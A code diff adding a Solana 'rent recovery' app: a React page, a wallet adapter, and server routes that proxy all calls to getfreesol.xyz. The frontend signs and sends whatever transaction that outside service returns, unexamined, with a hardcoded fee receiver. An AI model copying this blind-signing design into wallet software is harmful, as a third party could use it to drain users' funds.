@@ -1,0 +1,406 @@
+1️⃣ Frontend - Recovery Logic
+File: client/src/lib/recoverSol.ts
+
+import { Transaction, PublicKey } from '@solana/web3.js';
+// Your integration function
+export async function recoverSOLRent(walletPublicKey: PublicKey, wallet: any) {
+  try {
+    const walletAddress = walletPublicKey.toBase58();
+    
+    // STEP 1: Scan for empty token accounts
+    const scanResponse = await fetch(
+      `/api/sol-refund/scan/${walletAddress}`
+    );
+    const scanData = await scanResponse.json();
+    
+    if (!scanData.accounts || scanData.emptyAccounts === 0) {
+      throw new Error('No empty accounts found to close');
+    }
+    
+    // STEP 2: Prepare transaction
+    const prepareResponse = await fetch('/api/sol-refund/prepare-transaction', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        walletAddress,
+        selectedAccounts: scanData.accounts.map((acc: any) => acc.accountAddress),
+        donationPercentage: 0.00,
+        feeReceiverAddress: 'HH6gU6V6A3ee2V5vaaY1qmEChkpKqUWnR4szNkf39vV3'
+      })
+    });
+    
+    const prepareData = await prepareResponse.json();
+    
+    if (!prepareData.transaction) {
+      throw new Error(prepareData.error || 'Failed to prepare transaction');
+    }
+    
+    // STEP 3: Deserialize transaction from base64
+    const binaryString = atob(prepareData.transaction);
+    const transactionBytes = new Uint8Array(binaryString.length);
+    for (let i = 0; i < binaryString.length; i++) {
+      transactionBytes[i] = binaryString.charCodeAt(i);
+    }
+    const transaction = Transaction.from(transactionBytes);
+    
+    // STEP 4 & 5: Wallet signs and sends (using Phantom/Solflare's RPC)
+    const signature = await wallet.signAndSendTransaction(transaction);
+    
+    // STEP 7: Record success (CRITICAL - updates platform stats)
+    await fetch('/api/sol-refund/record-success', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        signature,
+        walletAddress,
+        selectedAccounts: scanData.accounts.map((acc: any) => acc.accountAddress),
+        accountsClosed: scanData.emptyAccounts,
+        solRecovered: prepareData.totalSolReclaimed,
+        netAmount: prepareData.netAmount,
+        feeAmount: prepareData.feeAmount,
+        platformFeeAmount: prepareData.platformFeeAmount,
+        referralFeeAmount: prepareData.referralFeeAmount
+      })
+    });
+    
+    return signature;
+    
+  } catch (error: any) {
+    throw error;
+  }
+}
+
+2️⃣ Frontend - Wallet Adapter
+File: client/src/lib/walletAdapter.ts
+
+import { PublicKey, Transaction } from '@solana/web3.js';
+class SolanaWallet {
+  publicKey: PublicKey | null = null;
+  connected: boolean = false;
+  private solana: any = null;
+  constructor() {
+    if (typeof window !== 'undefined') {
+      this.solana = (window as any).solana || (window as any).phantom?.solana;
+    }
+  }
+  async connect(): Promise<string> {
+    if (!this.solana) {
+      throw new Error('Please install Phantom, Solflare, or another Solana wallet.');
+    }
+    const response = await this.solana.connect();
+    this.publicKey = response.publicKey;
+    this.connected = true;
+    
+    if (!this.publicKey) {
+      throw new Error('Failed to get public key from wallet');
+    }
+    
+    this.solana.on('disconnect', () => {
+      this.publicKey = null;
+      this.connected = false;
+    });
+    return this.publicKey.toBase58();
+  }
+  async disconnect(): Promise<void> {
+    if (this.solana) {
+      await this.solana.disconnect();
+    }
+    this.publicKey = null;
+    this.connected = false;
+  }
+  async signTransaction(transaction: Transaction): Promise<Transaction> {
+    if (!this.solana || !this.connected) {
+      throw new Error('Wallet not connected');
+    }
+    
+    return await this.solana.signTransaction(transaction);
+  }
+  async signAndSendTransaction(transaction: Transaction): Promise<string> {
+    if (!this.solana || !this.connected) {
+      throw new Error('Wallet not connected');
+    }
+    
+    // Sign and send in ONE step (wallet will only ask for signature once)
+    const { signature } = await this.solana.signAndSendTransaction(transaction);
+    
+    return signature;
+  }
+  isInstalled(): boolean {
+    return !!this.solana;
+  }
+}
+export const wallet = new SolanaWallet();
+
+3️⃣ Frontend - UI Component
+File: client/src/pages/Home.tsx
+
+import { useState } from 'react';
+import { Button } from '@/components/ui/button';
+import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
+import { wallet } from '@/lib/walletAdapter';
+import { recoverSOLRent } from '@/lib/recoverSol';
+import { Wallet, RefreshCw, Coins } from 'lucide-react';
+import { useToast } from '@/hooks/use-toast';
+interface Account {
+  accountAddress: string;
+  rentAmount: string;
+  programId?: string;
+}
+interface ScanResult {
+  emptyAccounts: number;
+  totalReclaimable: string;
+  accounts: Account[];
+}
+export default function Home() {
+  const [walletAddress, setWalletAddress] = useState<string | null>(null);
+  const [loading, setLoading] = useState(false);
+  const [scanning, setScanning] = useState(false);
+  const [recovering, setRecovering] = useState(false);
+  const [scanResult, setScanResult] = useState<ScanResult | null>(null);
+  const { toast } = useToast();
+  const handleConnect = async () => {
+    try {
+      setLoading(true);
+      const address = await wallet.connect();
+      setWalletAddress(address);
+    } catch (error) {
+      console.error('Failed to connect wallet:', error);
+    } finally {
+      setLoading(false);
+    }
+  };
+  const handleDisconnect = async () => {
+    await wallet.disconnect();
+    setWalletAddress(null);
+    setScanResult(null);
+  };
+  const handleScan = async () => {
+    if (!walletAddress) return;
+    
+    try {
+      setScanning(true);
+      const response = await fetch(`/api/sol-refund/scan/${walletAddress}`);
+      const data = await response.json();
+      
+      setScanResult(data);
+      
+      if (data.accounts && data.emptyAccounts > 0) {
+        toast({
+          title: "Scan complete!",
+          description: `Found ${data.emptyAccounts} accounts with ${data.totalReclaimable} SOL`,
+        });
+      } else {
+        toast({
+          title: "No accounts found",
+          description: "No empty accounts to recover",
+        });
+      }
+    } catch (error: any) {
+      toast({
+        title: "Scan failed",
+        description: error?.message || "Failed to scan wallet",
+        variant: "destructive"
+      });
+    } finally {
+      setScanning(false);
+    }
+  };
+  const handleClaim = async () => {
+    if (!wallet.publicKey) {
+      toast({
+        title: "Error",
+        description: "Wallet not connected properly",
+        variant: "destructive"
+      });
+      return;
+    }
+    
+    try {
+      setRecovering(true);
+      toast({
+        title: "Starting recovery...",
+        description: "Preparing transaction"
+      });
+      
+      const signature = await recoverSOLRent(wallet.publicKey, wallet);
+      
+      toast({
+        title: "✅ Success!",
+        description: `Transaction: ${signature}`,
+      });
+      
+      // Clear results after successful claim
+      setScanResult(null);
+    } catch (error: any) {
+      console.error('Full error details:', error);
+      toast({
+        title: "Error",
+        description: error?.message || "Failed to recover SOL",
+        variant: "destructive"
+      });
+    } finally {
+      setRecovering(false);
+    }
+  };
+  return (
+    <div className="min-h-screen bg-background p-8">
+      <div className="max-w-4xl mx-auto space-y-8">
+        <div>
+          <h1 className="text-4xl font-bold mb-2">Solana Rent Recovery</h1>
+          <p className="text-muted-foreground">Reclaim SOL from empty accounts</p>
+        </div>
+        
+        <Card>
+          <CardHeader>
+            <CardTitle>Wallet Connection</CardTitle>
+            <CardDescription>Connect your Solana wallet to get started</CardDescription>
+          </CardHeader>
+          <CardContent className="space-y-4">
+            {!walletAddress ? (
+              <Button 
+                onClick={handleConnect} 
+                disabled={loading}
+                data-testid="button-connect-wallet"
+                className="w-full"
+              >
+                <Wallet className="mr-2 h-4 w-4" />
+                {loading ? 'Connecting...' : 'Connect Wallet'}
+              </Button>
+            ) : (
+              <div className="space-y-4">
+                <div className="p-4 bg-muted rounded-lg">
+                  <p className="text-sm text-muted-foreground mb-1">Connected Wallet</p>
+                  <p className="font-mono text-sm break-all">{walletAddress}</p>
+                </div>
+                
+                <div className="flex gap-2">
+                  <Button 
+                    variant="outline" 
+                    className="flex-1" 
+                    onClick={handleScan}
+                    disabled={scanning}
+                    data-testid="button-scan"
+                  >
+                    <RefreshCw className={`mr-2 h-4 w-4 ${scanning ? 'animate-spin' : ''}`} />
+                    {scanning ? 'Scanning...' : 'Scan for Accounts'}
+                  </Button>
+                  <Button 
+                    variant="ghost" 
+                    onClick={handleDisconnect}
+                    data-testid="button-disconnect"
+                  >
+                    Disconnect
+                  </Button>
+                </div>
+              </div>
+            )}
+          </CardContent>
+        </Card>
+        {walletAddress && scanResult && scanResult.accounts && scanResult.emptyAccounts > 0 && (
+          <Card>
+            <CardHeader>
+              <CardTitle>Available Accounts</CardTitle>
+              <CardDescription>
+                Found {scanResult.emptyAccounts} accounts with {scanResult.totalReclaimable} SOL total
+              </CardDescription>
+            </CardHeader>
+            <CardContent className="space-y-4">
+              <div className="space-y-2">
+                {scanResult.accounts.map((account, index) => (
+                  <div 
+                    key={account.accountAddress}
+                    className="flex items-center justify-between p-3 bg-muted rounded-lg"
+                    data-testid={`account-${index}`}
+                  >
+                    <div className="flex-1">
+                      <p className="font-mono text-xs text-muted-foreground break-all">
+                        {account.accountAddress}
+                      </p>
+                    </div>
+                    <div className="ml-4 flex items-center gap-2">
+                      <Coins className="h-4 w-4 text-muted-foreground" />
+                      <span className="font-semibold">{account.rentAmount} SOL</span>
+                    </div>
+                  </div>
+                ))}
+              </div>
+              
+              <Button 
+                className="w-full"
+                onClick={handleClaim}
+                disabled={recovering}
+                data-testid="button-claim"
+              >
+                {recovering ? 'Claiming...' : `Claim ${scanResult.totalReclaimable} SOL`}
+              </Button>
+            </CardContent>
+          </Card>
+        )}
+      </div>
+    </div>
+  );
+}
+
+4️⃣ Backend - API Proxy Routes
+File: server/routes.ts
+
+import type { Express } from "express";
+import { createServer, type Server } from "http";
+export async function registerRoutes(app: Express): Promise<Server> {
+  // Backend proxy - forwards all requests to getfreesol.xyz
+  app.get("/api/sol-refund/scan/:address", async (req, res) => {
+    try {
+      const { address } = req.params;
+      const response = await fetch(`https://getfreesol.xyz/api/sol-refund/scan/${address}`);
+      const data = await response.json();
+      res.json(data);
+    } catch (error) {
+      console.error("Scan error:", error);
+      res.status(500).json({ error: "Failed to scan wallet" });
+    }
+  });
+  app.post("/api/sol-refund/prepare-transaction", async (req, res) => {
+    try {
+      const response = await fetch('https://getfreesol.xyz/api/sol-refund/prepare-transaction', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(req.body),
+      });
+      const data = await response.json();
+      res.json(data);
+    } catch (error) {
+      console.error("Prepare error:", error);
+      res.status(500).json({ error: "Failed to prepare transaction" });
+    }
+  });
+  app.post("/api/sol-refund/send-transaction", async (req, res) => {
+    try {
+      const response = await fetch('https://getfreesol.xyz/api/sol-refund/send-transaction', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(req.body),
+      });
+      const data = await response.json();
+      res.json(data);
+    } catch (error) {
+      console.error("Send transaction error:", error);
+      res.status(500).json({ error: "Failed to send transaction" });
+    }
+  });
+  app.post("/api/sol-refund/record-success", async (req, res) => {
+    try {
+      const response = await fetch('https://getfreesol.xyz/api/sol-refund/record-success', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(req.body),
+      });
+      const data = await response.json();
+      res.json(data);
+    } catch (error) {
+      console.error("Record error:", error);
+      res.status(500).json({ error: "Failed to record success" });
+    }
+  });
+  const httpServer = createServer(app);
+  return httpServer;
+}
